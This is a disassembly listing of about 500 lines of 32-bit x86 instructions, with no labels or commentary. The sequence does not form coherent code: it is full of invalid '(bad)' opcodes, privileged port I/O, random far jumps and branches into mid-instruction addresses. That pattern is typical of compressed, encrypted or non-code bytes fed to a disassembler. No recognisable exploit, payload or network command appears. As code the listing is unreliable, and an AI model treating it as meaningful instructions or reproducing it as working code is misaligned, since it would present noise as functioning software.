  425e87:	adc    BYTE PTR fs:[ecx-0x3a],0x87
  425e8c:	or     al,0xd8
  425e8e:	in     al,0x40
  425e90:	in     eax,0x79
  425e92:	xchg   esp,eax
  425e93:	and    DWORD PTR [ecx],edi
  425e95:	rcr    DWORD PTR [ebp-0x3b],1
  425e98:	jno    0x425eef
  425e9a:	fsubr  QWORD PTR [eax]
  425e9c:	push   edi
  425e9d:	repz xchg esp,eax
  425e9f:	fistp  WORD PTR [esi]
  425ea1:	(bad)  
  425ea2:	loope  0x425ee9
  425ea4:	mov    edx,0xbaab4def
  425ea9:	adc    dl,BYTE PTR [eax-0x65]
  425eac:	inc    esi
  425ead:	std    
  425eae:	push   es
  425eaf:	pop    ebp
  425eb0:	cmp    esi,ebp
  425eb2:	mov    cl,0x4d
  425eb4:	or     eax,DWORD PTR [edi-0x3f7abe2c]
  425eba:	pop    ebx
  425ebb:	and    esp,eax
  425ebd:	shl    DWORD PTR [ebx-0x3e],cl
  425ec0:	js     0x425ec6
  425ec2:	add    DWORD PTR [ebp-0x6bf99641],ecx
  425ec8:	popa   
  425ec9:	retf   
  425eca:	daa    
  425ecb:	fs add ecx,esp
  425ece:	inc    ecx
  425ecf:	mov    WORD PTR ds:0x24079595,ss
  425ed5:	stos   DWORD PTR es:[edi],eax
  425ed6:	inc    edi
  425ed7:	cld    
  425ed8:	pop    edx
  425ed9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425eda:	out    dx,eax
  425edb:	dec    ebx
  425edc:	ficom  WORD PTR [esp+ecx*8-0x5c813c0d]
  425ee3:	jmp    0x425ee7
  425ee5:	jnp    0x425f4e
  425ee7:	sahf   
  425ee8:	outs   dx,BYTE PTR ds:[esi]
  425ee9:	mov    ecx,0x66885e35
  425eee:	outs   dx,BYTE PTR ds:[esi]
  425eef:	or     al,0x70
  425ef1:	xor    BYTE PTR ds:0x19159aca,0x6e
  425ef8:	push   edi
  425ef9:	mov    dl,0x53
  425efb:	jbe    0x425f65
  425efd:	pop    eax
  425efe:	cmc    
  425eff:	int    0x5e
  425f01:	test   al,0x70
  425f03:	push   esi
  425f04:	out    0x25,eax
  425f06:	jge    0x5764a88e
  425f0c:	aad    0xee
  425f0e:	push   ebx
  425f0f:	xor    al,0x69
  425f11:	jmp    0x425f2b
  425f13:	pop    ebp
  425f14:	sbb    eax,0xa5d09cec
  425f19:	jmp    0x2ddd:0x6c35cddc
  425f20:	add    BYTE PTR [edi+0x6b7ce3d7],cl
  425f26:	and    edi,ebp
  425f28:	loop   0x425f20
  425f2a:	stos   BYTE PTR es:[edi],al
  425f2b:	outs   dx,BYTE PTR ds:[esi]
  425f2c:	dec    edx
  425f2d:	lods   al,BYTE PTR ds:[esi]
  425f2e:	enter  0x2c56,0x2e
  425f32:	cmovge esi,DWORD PTR [eax+0x4b]
  425f36:	test   BYTE PTR [edx-0x72a69732],dh
  425f3c:	pop    ebx
  425f3d:	sahf   
  425f3e:	add    bh,BYTE PTR [esi-0x35ebb6f9]
  425f44:	mov    ds:0xddba5c9f,al
  425f49:	pop    eax
  425f4a:	sub    eax,0x5d12ea06
  425f4f:	dec    edx
  425f50:	mov    dl,0x7c
  425f52:	or     cl,bh
  425f54:	inc    edx
  425f55:	jnp    0x425eee
  425f57:	xchg   DWORD PTR [ebx-0x31],eax
  425f5a:	das    
  425f5b:	(bad)  
  425f5c:	loop   0x425eeb
  425f5e:	clc    
  425f5f:	and    eax,0x5f0d7383
  425f64:	fisttp WORD PTR [ecx-0x2e1c9c44]
  425f6a:	addr16 leave 
  425f6c:	lds    ebp,FWORD PTR [ebx+0x43]
  425f6f:	dec    eax
  425f70:	lea    esi,[ebx-0x12]
  425f73:	pusha  
  425f74:	push   eax
  425f75:	jecxz  0x425f2a
  425f77:	(bad)  
  425f78:	aaa    
  425f79:	test   ah,al
  425f7b:	jno    0x425f3b
  425f7d:	bnd ja 0x425fdd
  425f80:	addr16 test ecx,edi
  425f83:	or     ecx,DWORD PTR [ebx-0x77]
  425f86:	aas    
  425f87:	gs inc edx
  425f89:	and    esi,ecx
  425f8b:	or     bh,dl
  425f8d:	sbb    ch,BYTE PTR [ebx+0x59e31911]
  425f93:	push   0xfffffff8
  425f95:	jle    0x425f7a
  425f97:	(bad)  
  425f98:	fidiv  DWORD PTR [esi+0x46]
  425f9b:	jns    0x42600f
  425f9d:	shr    BYTE PTR [ebx+0xc6b24c2],1
  425fa3:	and    esp,esi
  425fa5:	add    ah,ah
  425fa7:	pop    ecx
  425fa8:	mov    eax,0xb0c6dcc7
  425fad:	imul   esp,DWORD PTR [eiz*4-0x15efb73c],0x3d962436
  425fb8:	push   ds
  425fb9:	cld    
  425fba:	je     0x425f8a
  425fbc:	jl     0x425f5e
  425fbe:	(bad)  
  425fbf:	pop    esi
  425fc0:	lods   eax,DWORD PTR ds:[esi]
  425fc1:	daa    
  425fc2:	(bad)  
  425fc3:	mov    dh,BYTE PTR [ebp+0x3e]
  425fc6:	ret    0xcaaa
  425fc9:	sbb    edi,ebp
  425fcb:	ror    DWORD PTR [eax+edx*8-0x1dce50db],1
  425fd2:	push   0xffffffcc
  425fd4:	pop    edx
  425fd5:	vpmulhw xmm6,xmm1,XMMWORD PTR [edi+edi*4+0x27]
  425fdb:	add    bh,cl
  425fdd:	loop   0x425fee
  425fdf:	ja     0x425fd5
  425fe1:	jle    0x425fa3
  425fe3:	(bad)  
  425fe4:	dec    cl
  425fe6:	fldenv [eax]
  425fe8:	mov    bh,0xf9
  425fea:	inc    edx
  425feb:	fwait
  425fec:	into   
  425fed:	(bad)  
  425fee:	fscale 
  425ff0:	dec    edi
  425ff1:	hlt    
  425ff2:	mov    ?,WORD PTR [edi+ebx*4+0x32]
  425ff6:	out    0xb2,al
  425ff8:	jmp    0xfd05ab2
  425ffd:	sub    edx,edx
  425fff:	pop    ss
  426000:	arpl   WORD PTR [edi+eiz*2],di
  426003:	add    bh,BYTE PTR [esi+0x597c632f]
  426009:	and    BYTE PTR [eax-0x49],bh
  42600c:	xor    esi,DWORD PTR [edx+0x68cc00e7]
  426012:	push   ebp
  426013:	pop    eax
  426014:	inc    BYTE PTR [esi+0x1728b8fe]
  42601a:	repnz mov esi,0xe98a0fa8
  426020:	xchg   BYTE PTR [edx-0x48368035],ah
  426026:	jno    0x426074
  426028:	xor    edi,DWORD PTR [edx-0x3f5a9748]
  42602e:	idiv   BYTE PTR [edx+0x6c44d457]
  426034:	adc    cl,0x43
  426037:	(bad)  
  426038:	pop    eax
  426039:	adc    DWORD PTR ds:0xad25f187,ebx
  42603f:	add    esp,DWORD PTR [eax+0x43e2ccce]
  426045:	or     esp,ecx
  426047:	sahf   
  426048:	pop    esi
  426049:	pop    ds
  42604a:	mov    bh,0xfe
  42604c:	test   BYTE PTR [ecx+ebp*2+0x5d],bl
  426050:	pop    ebx
  426051:	jmp    0xf0e43e52
  426056:	jl     0x425fe3
  426058:	and    al,0x8a
  42605a:	push   ebx
  42605b:	pop    eax
  42605c:	(bad)  
  42605d:	test   eax,0x5c7db5c5
  426062:	int3   
  426063:	stos   DWORD PTR es:[edi],eax
  426064:	jecxz  0x426025
  426066:	push   ebp
  426067:	test   eax,0x85df9c6b
  42606c:	jo     0x426022
  42606e:	cwde   
  42606f:	sbb    al,0x43
  426071:	sub    bl,0xa6
  426074:	mov    al,0x31
  426076:	mov    edx,0xb0979eaf
  42607b:	fld    DWORD PTR [ebp+0x35d833d6]
  426081:	mov    cs,esp
  426083:	loop   0x42601a
  426085:	pushf  
  426086:	ss dec esp
  426088:	and    al,0x34
  42608a:	dec    edi
  42608b:	sahf   
  42608c:	mov    dh,al
  42608e:	inc    eax
  42608f:	mov    ds:0x554a9beb,al
  426094:	(bad)  
  426096:	push   eax
  426097:	aaa    
  426098:	ds je  0x4260d1
  42609b:	mov    esp,0x58e53565
  4260a0:	dec    esp
  4260a1:	call   0xc7c9f0b0
  4260a6:	retf   
  4260a7:	popf   
  4260a8:	xor    DWORD PTR [eax],0xffffffd5
  4260ab:	push   ss
  4260ac:	fs inc esp
  4260ae:	push   esp
  4260af:	dec    edx
  4260b0:	in     eax,0x58
  4260b2:	mov    ds:0xe5d7ed30,eax
  4260b7:	pop    eax
  4260b8:	xor    BYTE PTR [ecx-0x64],0x8b
  4260bc:	mov    ebp,0xcb29cb3f
  4260c1:	pop    esi
  4260c2:	rol    BYTE PTR [esi-0x5c],0x7e
  4260c6:	inc    edi
  4260c7:	add    al,0xbd
  4260c9:	mov    cl,0x91
  4260cb:	inc    esi
  4260cc:	lds    eax,FWORD PTR [edi+0x4a094f90]
  4260d2:	add    eax,0x3fad8665
  4260d7:	es jmp 0xf05b45e
  4260dd:	test   al,0xe3
  4260df:	inc    edx
  4260e0:	data16 jno 0x4260c8
  4260e3:	repnz mov al,ds:0xdd0621f5
  4260e9:	imul   ebx,esi,0xffffffb9
  4260ec:	inc    eax
  4260ed:	cmp    eax,0xc938c89c
  4260f2:	mov    dh,0x4b
  4260f4:	xor    bh,ah
  4260f6:	sub    al,0xc0
  4260f8:	std    
  4260f9:	aam    0x70
  4260fb:	test   cl,bh
  4260fd:	cmp    bh,BYTE PTR [eax-0x52590325]
  426103:	lahf   
  426104:	adc    DWORD PTR [eax+0x8],esi
  426107:	mov    eax,ds:0x4e4c6dc7
  42610c:	push   ebx
  42610d:	add    DWORD PTR [ecx-0x7a],ebp
  426110:	iret   
  426111:	fsubrp st(5),st
  426113:	pushf  
  426114:	ret    0x1d47
  426117:	push   ss
  426118:	or     eax,0xe47b91e3
  42611d:	xor    al,0xd2
  42611f:	outs   dx,DWORD PTR ds:[esi]
  426120:	push   ebp
  426121:	push   ss
  426122:	pop    ecx
  426123:	pop    es
  426124:	les    ebx,FWORD PTR [esi-0x72]
  426127:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426128:	aaa    
  426129:	xor    al,0x8c
  42612b:	(bad)  
  42612c:	mov    ds:0x71ac7785,eax
  426131:	mov    edi,0x37454227
  426136:	fs jb  0x4260f3
  426139:	inc    ebp
  42613a:	loopne 0x4260db
  42613c:	xchg   esp,eax
  42613d:	js     0x42617a
  42613f:	mov    dl,0x7a
  426141:	or     eax,0x39507ead
  426146:	adc    BYTE PTR [ecx-0x32],cl
  426149:	loop   0x4261a7
  42614b:	inc    eax
  42614c:	jmp    0x4260f0
  42614e:	and    DWORD PTR [ecx],0xbda554c6
  426154:	addr16 iret 
  426156:	sbb    DWORD PTR [esi-0x4d5cb136],0xf7158d08
  426160:	cmp    eax,0xd818f43
  426165:	nop
  426166:	mov    edi,0xb6bee808
  42616b:	lds    ecx,FWORD PTR [esi+ebp*4-0x61307424]
  426172:	cmp    al,0x19
  426174:	les    edx,FWORD PTR [edi]
  426176:	add    cl,0x85
  426179:	or     BYTE PTR [edi],bh
  42617b:	setae  BYTE PTR [eax-0x6cfee1e1]
  426182:	mul    edi
  426184:	call   0x30ba:0x5c31e422
  42618b:	pop    esp
  42618c:	aas    
  42618d:	push   esp
  42618e:	mov    ebp,0xbcfabf1e
  426193:	or     eax,0xedbd9f21
  426198:	(bad)  
  426199:	jp     0x426219
  42619b:	rol    DWORD PTR [ecx-0x8],cl
  42619e:	fwait
  42619f:	(bad)  
  4261a1:	add    BYTE PTR [edi+0x725a45a2],ch
  4261a7:	jb     0x42613a
  4261a9:	push   es
  4261aa:	xchg   esi,eax
  4261ab:	sbb    edi,esp
  4261ad:	adc    al,bl
  4261af:	(bad)  
  4261b0:	rol    DWORD PTR [ecx-0x2d],0x35
  4261b4:	xor    DWORD PTR [ecx-0x30757472],esp
  4261ba:	icebp  
  4261bb:	jp     0x4261d0
  4261bd:	push   ebx
  4261be:	push   ecx
  4261bf:	ret    0x658d
  4261c2:	fisub  DWORD PTR [ebx+0x20dcdfce]
  4261c8:	sahf   
  4261c9:	mov    ebx,DWORD PTR [edx-0x7b836259]
  4261cf:	jmp    0xa2bbed85
  4261d4:	jbe    0x426196
  4261d6:	jp     0x426212
  4261d8:	cmp    ah,BYTE PTR [edx]
  4261da:	mov    dh,0xa7
  4261dc:	arpl   bp,si
  4261de:	repnz mov ds:0x20d38573,eax
  4261e4:	push   ecx
  4261e5:	fs mov bl,0x51
  4261e8:	add    al,0x37
  4261ea:	push   esp
  4261eb:	xchg   edi,eax
  4261ec:	adc    edx,DWORD PTR [edx]
  4261ee:	nop
  4261ef:	enter  0xf2c6,0xa4
  4261f3:	lods   al,BYTE PTR ds:[esi]
  4261f4:	hlt    
  4261f5:	out    dx,al
  4261f6:	pop    ss
  4261f7:	aad    0x24
  4261f9:	inc    eax
  4261fa:	push   es
  4261fb:	lds    ecx,FWORD PTR ds:0x58cf5876
  426201:	mov    DWORD PTR [edx+0x47ed0b8],0x5c2b2adf
  42620b:	jmp    0x4261dd
  42620d:	pop    esi
  42620e:	sub    eax,0x9cbde302
  426213:	push   esi
  426214:	push   0x71
  426216:	pusha  
  426217:	imul   ecx,DWORD PTR [eax+0x38],0x56
  42621b:	xlat   BYTE PTR ds:[ebx]
  42621c:	(bad)  
  42621d:	ret    
  42621e:	(bad)
  426222:	push   cs
  426223:	mul    DWORD PTR [esi-0x694b4cd1]
  426229:	xchg   DWORD PTR [eax-0x53],ebx
  42622c:	jno    0x4261db
  42622e:	cmp    DWORD PTR [eax+ebx*2-0x584cf02f],0x4ba5ef4f
  426239:	jecxz  0x42622a
  42623b:	icebp  
  42623c:	jp     0x4261ee
  42623e:	popf   
  42623f:	pop    edx
  426240:	cmp    al,0x3c
  426242:	sub    eax,0xe1ef7bea
  426247:	mov    dl,0x39
  426249:	js     0x4262a5
  42624b:	pop    ss
  42624c:	out    0xd,al
  42624e:	jecxz  0x426233
  426250:	dec    edx
  426251:	push   eax
  426252:	push   0x24
  426254:	outs   dx,BYTE PTR es:[esi]
  426256:	popf   
  426257:	cmp    BYTE PTR ds:0xc04b1637,al
  42625d:	(bad)  
  42625e:	pop    ebx
  42625f:	pop    edi
  426260:	sti    
  426261:	fld    TBYTE PTR [ebp-0x380a72b2]
  426267:	test   BYTE PTR [ecx],al
  426269:	loopne 0x426234
  42626b:	icebp  
  42626c:	sbb    ebx,DWORD PTR [ebp-0x973ac83]
  426272:	or     al,0x2e
  426274:	xchg   ebx,eax
  426275:	bound  ecx,QWORD PTR [edi+0x3ae467e2]
  42627b:	mov    edi,0x59
  426280:	add    BYTE PTR [eax],al
  426282:	jno    0x426247
  426284:	loop   0x426271
  426286:	bnd jmp 0x426302
  426289:	fcomi  st,st(7)
  42628b:	mov    edi,db7
  42628e:	inc    ebp
  42628f:	cwde   
  426290:	mov    edx,DWORD PTR [eax+0x1dac8]
  426296:	repz add al,0x0
  426299:	add    BYTE PTR [ebx+0x15],ch
  42629c:	in     eax,0x51
  42629e:	cwde   
  42629f:	outs   dx,BYTE PTR ds:[esi]
  4262a0:	xchg   ebx,eax
  4262a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4262a2:	lahf   
  4262a3:	xor    dl,BYTE PTR [esi]
  4262a5:	cmp    eax,0x24157199
  4262ab:	les    ebx,FWORD PTR [ebx-0x3442e2e]
  4262b1:	fimul  WORD PTR [edi]
  4262b3:	cmp    BYTE PTR [eax+0x6cf5827d],cl
  4262b9:	pop    ebp
  4262ba:	jne    0x4262dc
  4262bc:	sub    BYTE PTR [edx-0x5d59ff53],al
  4262c2:	jecxz  0x4262c7
  4262c4:	add    eax,0x443e73a0
  4262c9:	jbe    0x42628a
  4262cb:	mov    ebp,0x52ea1b0e
  4262d0:	or     al,0xbd
  4262d2:	test   eax,0x7a87672
  4262d7:	or     BYTE PTR [ebp+0x22],dh
  4262da:	pop    edx
  4262db:	inc    ebp
  4262dc:	inc    esp
  4262dd:	add    edi,ebx
  4262df:	pop    eax
  4262e0:	push   ecx
  4262e1:	fdivr  QWORD PTR [eax]
  4262e3:	sbb    bh,BYTE PTR [ebx-0x6aeeb65f]
  4262e9:	adc    al,0xd1
  4262eb:	inc    esi
  4262ec:	mov    edi,0xec1c38a6
  4262f1:	fdiv   QWORD PTR [eax+0x57]
  4262f4:	sbb    eax,0xfa7c4081
  4262f9:	(bad)  
  4262fa:	out    dx,al
  4262fb:	sub    dh,BYTE PTR [edx-0x6c]
  4262fe:	fwait
  4262ff:	dec    esi
  426300:	add    al,0x76
  426302:	sbb    BYTE PTR [edx+0x45637813],ah
  426308:	cmp    cl,BYTE PTR [ecx+0x37]
  42630b:	fsub   QWORD PTR [edi+eax*4]
  42630e:	and    BYTE PTR [ebx+0x3a],0x11
  426312:	lds    eax,FWORD PTR [edi-0x46]
  426315:	std    
  426316:	xor    eax,0xe1fa845d
  42631b:	push   ds
  42631c:	hlt    
  42631d:	and    BYTE PTR [ebx],dl
  42631f:	rcl    DWORD PTR [ebp+eiz*1-0x45],0x94
  426324:	sub    BYTE PTR [esi-0x7e],0x21
  426328:	fistp  QWORD PTR [edx]
  42632a:	or     cl,BYTE PTR [ecx-0x194d05ec]
  426330:	xchg   DWORD PTR [ebp-0x1d252bc0],edx
  426336:	je     0x42637f
  426338:	cmc    
  426339:	aam    0xa6
  42633b:	lds    ebx,FWORD PTR [ebp+0x7990373e]
  426341:	or     al,0x25
  426343:	sub    DWORD PTR [edx+esi*8],edi
  426346:	enter  0x95de,0xd7
  42634a:	leave  
  42634b:	nop
  42634c:	dec    edx
  42634d:	push   es
  42634e:	std    
  42634f:	cmp    edi,DWORD PTR ds:0xcfbcf791
  426355:	sub    eax,0x2af24c8f
  42635a:	push   0xfffffff9
  42635c:	loope  0x42635b
  42635e:	int3   
  42635f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426360:	or     ebx,eax
  426362:	sbb    eax,0x54a54c7a
  426367:	adc    al,0x81
  426369:	mov    DWORD PTR [edx],esi
  42636b:	pop    ebp
  42636c:	push   edx
  42636d:	in     eax,dx
  42636e:	inc    ebx
  42636f:	pop    ss
  426370:	lds    esi,FWORD PTR [edi+0x6941fd12]
  426376:	mov    bl,0xb
  426378:	pop    ebx
  426379:	mov    ds:0xcb4bd7dc,al
  42637e:	adc    DWORD PTR [eax+ecx*4+0x69],ebp
  426382:	outs   dx,DWORD PTR ds:[esi]
  426383:	dec    eax
  426384:	(bad)  
  426385:	adc    dl,al
  426387:	inc    esi
  426388:	dec    esi
  426389:	xchg   BYTE PTR [eax-0x6a76d08f],ch
  42638f:	cmp    dl,BYTE PTR [ecx]
  426391:	iret   
  426392:	lods   al,BYTE PTR ss:[esi]
  426394:	jno    0x4263a6
  426396:	loope  0x4263d6
  426398:	shl    DWORD PTR [ebp-0x44fe9de2],cl
  42639e:	ret    
  42639f:	lods   al,BYTE PTR ds:[esi]
  4263a0:	(bad)  
  4263a2:	push   ss
  4263a3:	neg    BYTE PTR [esi-0x74]
  4263a6:	xchg   esp,eax
  4263a7:	jp     0x426422
  4263a9:	es push eax
  4263ab:	sbb    al,dl
  4263ad:	js     0x4263d6
  4263af:	xchg   cl,al
  4263b1:	mov    dh,0x5e
  4263b3:	or     ebp,esp
  4263b5:	mov    al,0x97
  4263b7:	ins    BYTE PTR es:[edi],dx
  4263b8:	test   eax,0x913b8e12
  4263bd:	sub    dl,dl
  4263bf:	and    bh,dl
  4263c1:	hlt    
  4263c2:	icebp  
  4263c3:	mov    ah,0xc4
  4263c5:	and    BYTE PTR [ebx-0x5b],0x64
  4263c9:	std    
  4263ca:	scas   eax,DWORD PTR es:[edi]
  4263cb:	inc    esp
  4263cc:	in     eax,0x9e
  4263ce:	and    ecx,DWORD PTR [ebp+0x10d1a4c6]
  4263d4:	aam    0x35
  4263d6:	cmp    eax,0x82840123
  4263db:	dec    ecx
  4263dc:	ret    
  4263dd:	or     eax,0x729a4785
  4263e2:	(bad)  
  4263e3:	pop    ecx
  4263e4:	dec    edi
  4263e5:	cdq    
  4263e6:	cli    
  4263e7:	out    0xe2,eax
  4263e9:	xor    edi,DWORD PTR [edx-0x44]
  4263ec:	cwde   
  4263ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263ee:	sub    bl,ch
  4263f0:	xor    eax,0xdef0bdeb
  4263f5:	cmp    ebx,eax
  4263f7:	jmp    0x426400
  4263f9:	mov    dl,0x8c
  4263fb:	dec    ebx
  4263fc:	dec    edx
  4263fd:	or     al,0x28
  426400:	inc    esp
  426401:	test   BYTE PTR [ebx-0x2d0e38f0],dh
  426407:	std    
  426408:	xchg   ebp,eax
  426409:	popf   
  42640a:	retf   
  42640b:	push   esp
  42640c:	pop    ss
  42640d:	ficom  WORD PTR [ecx-0x26]
  426410:	outs   dx,DWORD PTR ds:[esi]
  426411:	imul   esi,DWORD PTR [ebx-0x18d4eb06],0xba57ef1c
  42641b:	push   cs
  42641c:	jbe    0x42641e
  42641e:	(bad)  
  426420:	mov    ebx,0xd42a1c43
  426425:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426426:	(bad)  
  426427:	in     al,dx
  426428:	mov    edx,0x51cbc88e
  42642d:	aad    0xed
  42642f:	adc    al,0xe6
  426431:	fcmovnb st,st(0)
  426433:	sahf   
  426434:	ror    BYTE PTR [esi-0x27e5f6b4],cl
  42643a:	sbb    eax,0x2e7a0a45
  42643f:	test   al,0x8
  426441:	pop    esp
  426442:	inc    ebp
  426443:	jp     0x42646b
  426445:	adc    bl,al
  426447:	mov    ecx,0xe54fa5be
  42644c:	dec    ecx
  42644d:	in     al,0xad
  42644f:	push   es
  426450:	inc    esi
  426451:	dec    ecx
  426452:	or     DWORD PTR [ecx],ebx
  426454:	and    ecx,ecx
  426456:	and    esi,edx
  426458:	and    eax,0x3099b0f9
  42645d:	pop    eax
  42645e:	push   esp
  42645f:	jb     0x4264c3
  426461:	fistp  QWORD PTR ds:0x9831005f
  426467:	add    BYTE PTR [esi-0x4a],ch
  42646a:	dec    ebx
  42646b:	push   es
  42646c:	xor    DWORD PTR [edx+edx*8],0x54
  426470:	out    dx,eax
  426471:	cmp    edi,ebp
  426473:	mov    eax,ds:0x9f60d3ea
  426478:	add    eax,0x6ed8c90a
  42647d:	into   
  42647e:	jo     0x426449
  426480:	jmp    0x2546:0xe71d0896
  426487:	pusha  
  426488:	addr16 mov cl,0x21
  42648b:	aas    
  42648c:	cmp    eax,0xca7d0b9b
  426491:	ins    BYTE PTR es:[edi],dx
  426492:	rol    dh,1
  426494:	dec    esp
  426495:	scas   al,BYTE PTR es:[edi]
  426496:	es or  bh,al
  426499:	shl    DWORD PTR [ecx+0x5d6b6068],1
  42649f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4264a0:	or     eax,0x7b3eca3a
  4264a5:	fs pop es
  4264a7:	in     eax,0x30
  4264a9:	(bad)  
  4264aa:	in     al,0xfc
  4264ac:	and    ah,cl
  4264ae:	cld    
  4264af:	ds push es
  4264b1:	in     eax,0x6d
  4264b3:	push   esi
  4264b4:	icebp  
  4264b5:	lods   eax,DWORD PTR ds:[esi]
  4264b6:	in     eax,dx
  4264b7:	mov    WORD PTR [edi-0x5f727909],cs
  4264bd:	push   edx
  4264be:	(bad)  
  4264bf:	pop    ds
  4264c0:	rol    DWORD PTR [ebx],cl
  4264c2:	sbb    di,cx
  4264c5:	add    eax,0xa52d1fb6
  4264ca:	iret   
  4264cb:	xor    al,0x33
  4264cd:	mov    dl,0x90
  4264cf:	das    
  4264d0:	mul    DWORD PTR [esi]
  4264d2:	mov    ds:0x483d4499,eax
  4264d7:	in     al,dx
  4264d8:	push   ebp
  4264d9:	add    bh,BYTE PTR [eax]
  4264db:	dec    esp
  4264dc:	xchg   ebx,eax
  4264dd:	rcl    DWORD PTR [edx],1
  4264df:	sub    BYTE PTR [ebx+0x204f43e8],al
  4264e5:	adc    cl,dh
  4264e7:	xchg   ebp,eax
  4264e8:	fisttp QWORD PTR [eax+eax*8]
  4264eb:	push   DWORD PTR ss:[edx]
  4264ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4264ef:	pop    ebp
  4264f0:	shr    BYTE PTR [esi-0x3ee750d5],1
  4264f6:	shl    ebp,0xaa
  4264f9:	dec    eax
  4264fa:	dec    esp
  4264fb:	les    ebp,FWORD PTR [ecx+0x4b35b6d9]
  426501:	sub    BYTE PTR [eax],ah
  426503:	aaa    
  426504:	jmp    0x69f0:0x3ff40181
  42650b:	stos   BYTE PTR es:[edi],al
  42650c:	mov    ebp,0x18cfb264
  426511:	xor    eax,0xc97ea11c
  426516:	mov    ecx,0xbab197f2
  42651b:	cli    
  42651c:	(bad)  
  42651e:	outs   dx,DWORD PTR ds:[esi]
  42651f:	je     0x4264a1
  426521:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426522:	mov    ebx,0xacee7fdf
  426527:	jg     0x426571
  426529:	jecxz  0x4264e2
  42652b:	imul   ebx,DWORD PTR [ebp-0x54],0xffffff85
  42652f:	retf   0xf33
  426532:	xlat   BYTE PTR ds:[ebx]
  426533:	xchg   esp,eax
  426534:	mov    BYTE PTR [edx-0x59],0x33
  426538:	rcr    DWORD PTR [ebp-0xe],cl
  42653b:	cmp    eax,0x9826d493
  426540:	sti    
  426541:	mov    dl,BYTE PTR ds:0xc936a19a
  426547:	in     al,0x2c
  426549:	inc    edi
  42654a:	inc    edi
  42654b:	push   esp
  42654c:	leave  
  42654d:	mov    ah,0x79
  42654f:	call   0x12e:0xb4a1c9ae
  426556:	inc    esp
  426557:	jmp    0x4264e8
  426559:	pusha  
  42655a:	dec    edx
  42655b:	mov    dl,0x84
  42655d:	rol    BYTE PTR [ebp*4-0x658f8b44],cl
  426564:	push   esi
  426565:	out    0xbf,al
  426567:	pop    esi
  426568:	js     0x426553
  42656a:	ins    BYTE PTR es:[edi],dx
  42656b:	sub    DWORD PTR [edi],0x7cd18488
  426571:	(bad)  
  426572:	or     eax,0x695cb0de
  426577:	pop    ebp
  426578:	dec    ebp
  426579:	xor    eax,0x5bdfc40f
  42657e:	(bad)  
  42657f:	fnstenv [ebx-0x52]
  426582:	mov    dl,0x3f
  426584:	sbb    eax,0xf24c2e2f
  426589:	pop    eax
  42658a:	bound  esi,QWORD PTR [eax-0x580c9e56]
  426590:	mov    ecx,0x7ebf6516
  426595:	fimul  WORD PTR [edi+0x3]
  426598:	pop    ebp
  426599:	mov    WORD PTR [ebx+ebx*2-0x51],ss
  42659d:	test   BYTE PTR [ecx],0xa4
  4265a0:	jb     0x426563
  4265a2:	sbb    al,0x4e
  4265a4:	fbld   TBYTE PTR [ebx]
  4265a6:	push   esi
  4265a7:	mov    esp,0x2e8c3a36
  4265ac:	mov    ah,0x0
  4265ae:	jno    0x4265ff
  4265b0:	or     eax,0xf7fcb276
  4265b5:	lds    esi,FWORD PTR [edi]
  4265b7:	fistp  WORD PTR [ecx+0x6c0c06fd]
  4265bd:	test   BYTE PTR [ebx-0x24],al
  4265c0:	sub    DWORD PTR [edx],edi
  4265c2:	push   ebp
  4265c3:	push   0xffffffb0
  4265c5:	das    
  4265c6:	call   0x45061dc3
  4265cb:	mov    al,0xc
  4265cd:	inc    ebp
  4265ce:	inc    ebp
  4265cf:	cs clc 
  4265d1:	or     BYTE PTR [ebx+0x9b7fda9],bl
  4265d7:	sub    BYTE PTR ds:0xdbe143eb,dl
  4265dd:	sahf   
  4265de:	xchg   esi,eax
  4265df:	push   edi
  4265e0:	cwde   
  4265e1:	bound  esp,QWORD PTR [esi-0x6cfdf5b4]
  4265e7:	fcmovu st,st(1)
  4265e9:	ja     0x42664f
  4265eb:	(bad)  
  4265ec:	cdq    
  4265ed:	mov    ebx,0xad7d4abe
  4265f2:	ins    DWORD PTR es:[edi],dx
  4265f3:	mov    DWORD PTR [ebx-0x63fda5ce],esi
  4265f9:	pop    ds
  4265fa:	cmp    eax,0xcb460570
  4265ff:	push   edx
  426600:	mov    al,BYTE PTR [edi]
  426602:	fimul  WORD PTR [esi-0x1a]
  426606:	repz mov al,ds:0xfcd34c67
  42660c:	dec    ecx
  42660d:	jge    0x426617
  42660f:	jae    0x42664c
  426611:	pop    es
  426612:	fiadd  DWORD PTR [eax]
  426614:	jbe    0x42660c
  426616:	aaa    
  426617:	cli    
  426618:	push   es
  426619:	push   0x61
  42661b:	xchg   BYTE PTR [ebx-0x3c],ch
  42661e:	sub    DWORD PTR [edi+0x7b],edi
  426621:	and    BYTE PTR [eax+0x42],al
  426624:	or     ch,dl
  426626:	mov    bh,0x26
  426628:	int    0x79
  42662a:	sub    eax,0xf90f81f9
  42662f:	fwait
  426630:	mov    ?,WORD PTR [ebp+0x6d]
  426633:	push   ecx
  426634:	xor    esi,esp
  426636:	ror    DWORD PTR [eax],1
  426638:	push   0x5c
  42663a:	jbe    0x4266a2
  42663c:	xlat   BYTE PTR ds:[ebx]
  42663d:	jmp    FWORD PTR [edi-0xb2f92b]
  426643:	sub    BYTE PTR [eax+ecx*4],al
  426646:	cmp    DWORD PTR [edx+0x62],0xe359f387
  42664d:	popa   
  42664e:	mov    ds:0xb854dc89,al
  426653:	pop    ss
  426654:	sahf   
  426655:	lods   al,BYTE PTR ds:[esi]
  426656:	dec    esi
  426657:	ins    DWORD PTR es:[edi],dx
  426658:	adc    al,0x97
  42665a:	imul   edx,DWORD PTR [ecx+ecx*1+0x1fbcbb22],0xdef050a5
  426665:	pop    ecx
  426666:	jge    0x42667c
  426668:	pop    edi
  426669:	retf   0x6b0b
  42666c:	inc    eax
  42666d:	aaa    
  42666e:	stos   BYTE PTR es:[edi],al
  42666f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426670:	cld    
  426671:	rcl    bh,0xa
  426674:	cmp    esp,ecx
  426676:	adc    cl,BYTE PTR [edx+0x4c7cbba8]
  42667c:	ins    DWORD PTR es:[edi],dx
